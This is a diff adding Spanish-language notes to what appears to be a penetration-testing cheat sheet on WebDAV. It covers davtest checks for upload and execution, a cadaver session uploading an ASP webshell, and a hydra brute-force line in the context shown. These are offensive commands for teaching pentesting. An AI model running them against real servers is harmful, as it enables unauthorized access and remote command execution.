@@ -49,13 +49,26 @@ hydra -L usr_file -P pass_file <IP> http-get /dir
 
 Se utiliza para escanear, autenticar y explotar un servidor WebDAV. Está preinstalado en la mayoría de las distribuciones de pruebas de penetración ofensivas como Kali y Parrot OS.
 
+Esta herramienta comprueba si puede crear directorios, subir archivos y si es posible la ejecución de los mismos.
 
+```bash
+davtest -auth usr:pass -url http://host/webdab
+```
 
 ### Cadaver
 
 Cadaver admite la carga y descarga de archivos, la visualización en pantalla, la edición in situ, las operaciones de espacio de nombres (mover/copiar), la creación y eliminación de colecciones, la manipulación de propiedades y el bloqueo de recursos en servidores WebDAV. Preinstalado en la mayoría de las distribuciones de pruebas de penetración ofensivas como Kali y Parrot OS.
 
+Lo más importante con esta herramienta es que después de comprobar que tipo de archivos se pueden ejecutar en el servidor, podemos usarla para subir nuestro payload al servidor mediante una shell:
 
+```bash
+cadaver http://host/webdab
+Username: usr
+Password: pass
+dav:/webdab/> put /usr/share/webshells/asp/webshell.asp
+```
+
+Una webshell es un archivo (normalmente en un lenguaje de scripting como PHP, ASP, JSP o Python) que se sube a un servidor web y permite ejecutar comandos en el sistema operativo del servidor a través del navegador o peticiones HTTP.
 
 ### Metasploit Framework
 
